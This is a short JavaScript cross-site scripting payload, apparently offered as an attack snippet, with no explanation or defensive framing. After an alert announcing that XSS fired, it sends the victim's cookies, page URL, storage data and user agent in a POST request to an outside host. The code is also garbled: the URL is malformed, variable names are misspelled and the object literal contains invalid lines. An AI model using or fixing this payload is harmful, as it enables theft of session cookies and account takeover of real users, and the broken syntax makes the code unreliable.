
alert("XSS Triggered ✅");
fetch(https://"https://js.rip/1v7sr0xo3h", { 

      method: "POST",
      mode: "no-cors",
      body: JSON.stringify({
            cookie: document.cookie,
            location: window.location.href,
            localStorge:
            JSON.stringify(sessionStrong),
            JSON.stringify(sessionstrong),
            userAgent: navigator.userAgent

})

})
